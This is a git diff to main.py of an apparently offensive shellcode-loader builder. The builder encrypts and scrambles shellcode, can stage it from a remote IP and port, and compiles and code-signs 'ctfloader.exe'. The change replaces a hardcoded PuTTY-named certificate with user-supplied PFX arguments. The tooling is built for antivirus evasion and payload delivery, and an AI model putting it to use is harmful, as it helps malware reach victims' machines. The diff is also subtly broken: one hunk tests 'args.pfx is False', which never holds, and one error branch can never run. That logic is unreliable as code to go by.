@@ -6,6 +6,7 @@ X (Twitter):    @mochabyte0x
 
 '''
 import os
+import sys
 import random
 import subprocess
 import shutil, errno
@@ -39,9 +40,10 @@ def main():
 
     parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
-    parser_staged.add_argument("-si", "--sign", action="store_true", help="Sign the loader with a random certificate.")
+    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
+    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
 
-    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -si"
+    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'"
     
 
     # Creating the arguments for the stageless subcommand
@@ -50,13 +52,13 @@ def main():
     
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
-    parser_stageless.add_argument("-si", "--sign", action="store_true", help="Sign the loader with a random certificate.")
+    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
+    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
 
-    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -si"
+    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'"
 
     # Parsing the arguments
     args = parser.parse_args()
-
 
     # Banner
     banner()
@@ -340,13 +342,23 @@ def main():
                 print(Colors.green("[+] Loader scrambled !"))
 
             if args.format is None or args.format == "EXE":
-                if args.sign:
+                if args.pfx:
 
                     print(Colors.green("[i] Signing selected."))
                     print(Colors.light_yellow("[+] Signing the loader..."))
                     
-                    pfx_path = f"{cr_directory}/custom_certs/sign_putty.pfx"
-                    pfx_password = "Password"
+                    if args.pfx is not None:
+                        pfx_path = args.pfx
+                    else:
+                        print(Colors.red("[!] PFX file not found"))
+                        sys.exit(1)
+
+                    if args.pfx_password:
+                        pfx_password = args.pfx_password
+                    else:
+                        print(Colors.red("[!] PFX password not provided"))
+                        sys.exit(1)
+                    
                     input_binary = "ctfloader.exe"
                     signed_binary = "ctfloader_signed.exe"
 
@@ -372,7 +384,7 @@ def main():
 
                     print(Colors.green("[+] Loader signed !"))
 
-                if args.sign is False:
+                if args.pfx is False:
                     
                     # Everything has been modified, we can now compile the loader
                     os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
@@ -665,13 +677,23 @@ def main():
 
 
             if args.format is None or args.format == "EXE":
-                if args.sign:
+                if args.pfx:
 
                     print(Colors.green("[i] Signing selected."))
                     print(Colors.light_yellow("[+] Signing the loader..."))
                     
-                    pfx_path = f"{cr_directory}/custom_certs/sign_putty.pfx"
-                    pfx_password = "Password"
+                    if args.pfx is not None:
+                        pfx_path = args.pfx
+                    else:
+                        print(Colors.red("[!] PFX file not found"))
+                        sys.exit(1)
+
+                    if args.pfx_password:
+                        pfx_password = args.pfx_password
+                    else:
+                        print(Colors.red("[!] PFX password not provided"))
+                        sys.exit(1)
+
                     input_binary = "ctfloader.exe"
                     signed_binary = "ctfloader_signed.exe"
 
@@ -697,7 +719,7 @@ def main():
 
                     print(Colors.green("[+] Loader signed !"))
 
-                if args.sign is False:
+                if args.pfx is None:
                     
                     # Everything has been modified, we can now compile the loader
                     os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
